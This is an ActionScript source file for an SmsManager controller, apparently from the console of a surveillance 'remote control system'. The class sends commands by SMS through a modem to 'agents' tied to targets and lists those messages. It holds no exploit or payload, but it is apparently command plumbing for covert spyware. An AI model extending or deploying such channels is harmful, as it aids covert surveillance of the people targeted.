package it.ht.rcs.console.sms.controller
{
  import it.ht.rcs.console.DB;
  import it.ht.rcs.console.ObjectUtils;
  import it.ht.rcs.console.agent.controller.AgentManager;
  import it.ht.rcs.console.agent.model.Agent;
  import it.ht.rcs.console.controller.ItemManager;
  import it.ht.rcs.console.dashboard.controller.DashboardController;
  import it.ht.rcs.console.modem.model.Modem;
  import it.ht.rcs.console.operation.model.Operation;
  import it.ht.rcs.console.push.PushController;
  import it.ht.rcs.console.push.PushEvent;
  import it.ht.rcs.console.search.controller.SearchManager;
  import it.ht.rcs.console.search.model.Stat;
  import it.ht.rcs.console.search.model.StatEvidence;
  import it.ht.rcs.console.sms.model.Sms;
  import it.ht.rcs.console.sms.rest.DBSms;
  import it.ht.rcs.console.target.controller.TargetManager;
  import it.ht.rcs.console.target.model.Target;
  
  import mx.collections.ArrayCollection;
  import mx.collections.ListCollectionView;
  import mx.events.CollectionEvent;
  import mx.rpc.events.FaultEvent;
  import mx.rpc.events.ResultEvent;
  import mx.utils.ArrayUtil;
  
  public class SmsManager extends ItemManager
  {
    
    public function SmsManager()
    {
      super(Sms);
      //PushController.instance.addEventListener(PushEvent.OPERATION, onOperationPush);
    }
    
    private static var _instance:SmsManager=new SmsManager();
    
    public static function get instance():SmsManager
    {
      return _instance;
    }
    
    public function send(agent:Agent, modem:Modem, command:String, callback:Function):void
    {
      DB.instance.sms.send(agent, modem, command, callback);
    }
    
    public function all(agent:Agent, callback:Function):void
    {
      DB.instance.sms.all(agent, callback);
    }
    
    
    override public function refresh():void
    {
      super.refresh();
      //DB.instance.sms.all(false, onResult);
    }
    
    private function onResult(e:ResultEvent):void
    {
      clear();
      for each (var item:* in e.result.source)
      addItem(item);
      dispatchDataLoadedEvent();
    }
    

    
  }
  
}
